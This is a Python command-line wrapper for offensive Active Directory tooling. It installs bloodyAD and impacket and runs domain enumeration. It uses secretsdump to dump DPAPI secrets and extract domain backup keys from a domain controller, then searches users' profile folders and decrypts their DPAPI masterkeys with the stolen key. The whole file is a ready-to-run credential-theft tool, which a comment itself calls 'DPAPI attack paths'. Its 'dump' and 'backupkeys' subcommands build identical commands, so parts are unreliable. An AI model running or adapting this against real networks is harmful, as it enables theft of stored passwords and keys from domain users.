#!/usr/bin/env python3
import argparse
import subprocess
import shutil
import os,sys,re
import logging
__version__ = "0.3"

def check_tool(name):
    """Ensure a tool is in PATH or exit."""
    path = shutil.which(name)
    if not path:
        logging.error(f"Required tool '{name}' not found in PATH.")
        sys.exit(1)
    return path

def run_cmd(cmd, capture_output=False):
    """Execute a command and handle errors."""
    logging.info(f"Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=capture_output, text=True)
    if result.returncode != 0:
        logging.error(f"Command failed: {' '.join(cmd)}")
        if capture_output:
            logging.error(result.stderr.strip())
        sys.exit(result.returncode)
    return result.stdout if capture_output else None

def setup(args):
    """Install or upgrade required Python packages via pip."""
    logging.info("Installing/upgrading requirements via pip...")
    pip_cmd = [sys.executable, "-m", "pip", "install", "--upgrade", "bloodyAD", "impacket", "dpapi-tools"]
    run_cmd(pip_cmd)

def check(args):
    """Verify required tools are available on PATH."""
    logging.info("Checking required tools...")
    tools = [
        args.bloodyad_cmd or "bloodyAD.py",
        args.secretsdump_cmd or "secretsdump.py",
        args.dpapi_cmd or "dpapi_tools.py"
    ]
    missing = False
    for tool in tools:
        try:
            check_tool(tool)
        except SystemExit:
            missing = True
    if missing:
        logging.error("One or more tools are missing. Run 'setup' to install requirements.")
        sys.exit(1)
    logging.info("All required tools are present.")

def enum(args):
    """Run bloodyAD enumeration commands."""
    tool = check_tool(args.bloodyad_cmd or "bloodyAD.py")
    cmd = [tool, "enum"] + args.bloodyad_args
    run_cmd(cmd)

def dump(args):
    """Dump DPAPI blobs using secretsdump.py."""
    tool = check_tool(args.secretsdump_cmd or "secretsdump.py")
    cmd = [tool, args.target, "-just-dpapi", "-system"] + args.secretsdump_args
    run_cmd(cmd)

def decrypt(args):
    """Decrypt DPAPI masterkeys and blobs."""
    tool = check_tool(args.dpapi_cmd or "dpapi_tools.py")
    cmd = [tool, "decrypt"] + args.decrypt_args
    output = run_cmd(cmd, capture_output=True)
    print(output.strip())

def backupkeys(args):
    """Extract domain backup DPAPI keys via secretsdump."""
    tool = check_tool(args.secretsdump_cmd or "secretsdump.py")
    cmd = [tool, args.target, "-just-dpapi", "-system"] + args.backup_args
    run_cmd(cmd)

def masterkeys(args):
    """List and decrypt local user DPAPI masterkeys."""
    import glob
    import os
    tool = check_tool(args.dpapi_cmd or "dpapi_tools.py")
    pattern = os.path.join(args.path, "*", "AppData", "Roaming", "Microsoft", "Protect", "*", "*key*")
    files = glob.glob(pattern)
    if not files:
        logging.warning(f"No masterkey files found under: {pattern}")
    for f in files:
        logging.info(f"Decrypting masterkey file: {f}")
        cmd = [tool, "decrypt", f, "--backupkey", args.backupkey_file] + args.masterkey_args
        run_cmd(cmd)

def main():
    parser = argparse.ArgumentParser(
        description=f"DPAPI Wrapper v{__version__} - manage bloodyAD, secretsdump, and DPAPI decryption tools"
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--bloodyad-cmd", help="Path to bloodyAD.py executable/script")
    parser.add_argument("--secretsdump-cmd", help="Path to secretsdump.py executable/script")
    parser.add_argument("--dpapi-cmd", help="Path to DPAPI decrypt tool (dpapi_tools.py)")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Setup and check
    p_setup = subparsers.add_parser("setup", help="Install or upgrade bloodyAD, impacket, and dpapi-tools via pip")
    p_setup.set_defaults(func=setup)

    p_check = subparsers.add_parser("check", help="Verify required tools are installed and available")
    p_check.set_defaults(func=check)

    # DPAPI-specific operations
    p_enum = subparsers.add_parser("enum", help="Run bloodyAD enumeration")
    p_enum.add_argument("bloodyad_args", nargs=argparse.REMAINDER, help="Arguments for bloodyAD")
    p_enum.set_defaults(func=enum)

    p_dump = subparsers.add_parser("dump", help="Dump DPAPI blobs using secretsdump")
    p_dump.add_argument("target", help="Target (e.g., DOMAIN/USER or host)")
    p_dump.add_argument("secretsdump_args", nargs=argparse.REMAINDER, help="Additional secretsdump args")
    p_dump.set_defaults(func=dump)

    p_decrypt = subparsers.add_parser("decrypt", help="Decrypt DPAPI masterkeys and blobs")
    p_decrypt.add_argument("decrypt_args", nargs=argparse.REMAINDER, help="Arguments for DPAPI decryption tool")
    p_decrypt.set_defaults(func=decrypt)

    # New commands for additional DPAPI attack paths
    p_backup = subparsers.add_parser("backupkeys", help="Extract domain backup DPAPI keys via secretsdump")
    p_backup.add_argument("target", help="Target DC (e.g., DOMAIN/USER or host)")
    p_backup.add_argument("backup_args", nargs=argparse.REMAINDER, help="Additional secretsdump args")
    p_backup.set_defaults(func=backupkeys)

    p_master = subparsers.add_parser("masterkeys", help="List and decrypt local user DPAPI masterkeys")
    p_master.add_argument("path", help="Base directory to search for masterkey files, e.g. C:\\Users")
    p_master.add_argument("--backupkey-file", required=True, help="Path to DPAPI domain backup key file")
    p_master.add_argument("masterkey_args", nargs=argparse.REMAINDER, help="Additional dpapi_tools decrypt args")
    p_master.set_defaults(func=masterkeys)

    args = parser.parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s"
    )
    args.func(args)

if __name__ == "__main__":
    main()
##
##
